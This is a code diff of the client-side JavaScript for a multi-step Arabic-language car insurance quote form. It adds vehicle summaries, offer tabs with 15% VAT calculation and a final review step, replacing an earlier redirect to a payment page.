+            formData.value = document.getElementById('vehicle-value').value;
+            formData.year = document.getElementById('manufacture-year').value;
+            formData.make = document.getElementById('make-model').value || 'غير محدد';
+            formData.plate = document.getElementById('plate-number').value || 'غير محدد';
+            
+            // تعبئة ملخص المركبة في الخطوة 3
+            document.getElementById('sum-make').innerText = formData.make;
+            document.getElementById('sum-year').innerText = formData.year || 'غير محدد';
+            document.getElementById('sum-value').innerText = formData.value ? formData.value + ' ريال' : 'غير محدد';
+            document.getElementById('sum-purpose').innerText = formData.purpose;
+            document.getElementById('sum-repair').innerText = formData.repair || 'الوكالة';
+
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function goBackToStep2() {
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // --- Step 3 Logic ---
+        function switchOfferTab(element, type) {
+            document.querySelectorAll('#step3 .radio-group .radio-option').forEach(radio => {
+                radio.classList.remove('active');
+            });
+            element.classList.add('active');
+
+            document.getElementById('offers-third-party').style.display = 'none';
+            document.getElementById('offers-comprehensive').style.display = 'none';
+            document.getElementById('offers-premium').style.display = 'none';
+
+            if (type === 'third-party') {
+                document.getElementById('offers-third-party').style.display = 'block';
+            } else if (type === 'comprehensive') {
+                document.getElementById('offers-comprehensive').style.display = 'block';
+            } else if (type === 'premium') {
+                document.getElementById('offers-premium').style.display = 'block';
+            }
+        }
+
+        function selectFinalOffer(company, type, basePrice, element) {
             document.querySelectorAll('.offer-card').forEach(card => {
                 card.classList.remove('active');
             });
             element.classList.add('active');
-            isOfferSelected = true;
 
-            const offerTitle = element.querySelector('.offer-title').innerText;
-            const offerPrice = element.querySelector('.offer-price').innerText.replace('ر.س', '').trim();
+            const vat = basePrice * 0.15;
+            const total = basePrice + vat;
 
-            selectedOfferDetails = {
-                title: offerTitle,
-                price: offerPrice
+            selectedOffer = {
+                company: company,
+                type: type,
+                basePrice: basePrice,
+                vat: vat,
+                total: total
             };
+            isOfferSelected = true;
         }
 
-        function confirmOffer() {
+        function confirmOfferSelection() {
             if (!isOfferSelected) {
                 alert("يرجى اختيار أحد العروض أولاً للمتابعة.");
                 return;
             }
-            
-            localStorage.setItem('selectedInsuranceOffer', JSON.stringify(selectedOfferDetails));
-            window.location.href = "pay.html"; 
+            goToStep4();
+        }
+
+        // --- Step 4 Logic ---
+        function goToStep4() {
+            document.getElementById('final-name').innerText = formData.name;
+            document.getElementById('final-dob').innerText = formData.dob;
+            document.getElementById('final-id').innerText = formData.id;
+            document.getElementById('final-type').innerText = 'تأمين ' + selectedOffer.type;
+
+            document.getElementById('final-company').innerText = selectedOffer.company;
+            document.getElementById('final-type-summary').innerText = 'تأمين ' + selectedOffer.type;
+            document.getElementById('final-base-price').innerText = selectedOffer.basePrice.toFixed(2) + ' ر.س';
+            document.getElementById('final-vat').innerText = selectedOffer.vat.toFixed(2) + ' ر.س';
+            document.getElementById('final-total').innerText = selectedOffer.total.toFixed(2) + ' ر.س';
+
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step4').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function goBackToStep3() {
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
     </script>
 </body>
